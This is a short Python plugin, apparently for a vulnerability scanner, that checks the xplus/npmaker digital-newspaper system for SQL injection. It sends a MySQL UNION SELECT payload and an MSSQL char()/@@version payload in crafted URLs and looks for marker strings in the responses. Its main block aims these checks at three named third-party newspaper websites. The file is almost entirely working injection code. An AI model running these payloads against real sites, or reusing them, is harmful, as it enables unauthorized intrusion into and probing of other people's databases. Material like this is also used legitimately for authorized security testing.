#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:npmaker数字报漏洞集
#Refer:http://www.2cto.com/Article/201307/231014.html


def assign(service,arg):
    if service=="xplus":
        return True,arg 


def  audit(arg):
    #mysql
    
    url=arg+"www/index.php?mod=admin&con=deliver&act=view&username=809763517&deliId=-32%20UNION%20SELECT%201,md5(1),3,4,5,6,7,8,9,10,11,12,13--"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole("mysql: "+url)
    else:
    #mssql
        url=arg+"www/index.php?mod=index&con=Review&act=getallpaper&papertype=scrb%27%20and%20char(71)%252Bchar(65)%252Bchar(79)%252Bchar(74)%252Bchar(73)%252B@@version%3E0--"
        code,head,res,errcode,_=curl.curl2(url)
        if code==200   and 'GAOJIMicrosoft' in res:
            security_hole("mssql: "+url)
if __name__=="__main__":
    from dummy import *
    audit(assign('xplus','http://paper.fynews.net/')[1])
    audit(assign('xplus','http://news.xd56b.com/')[1])
    audit(assign('xplus','http://epaper.xsmd.com.cn/')[1])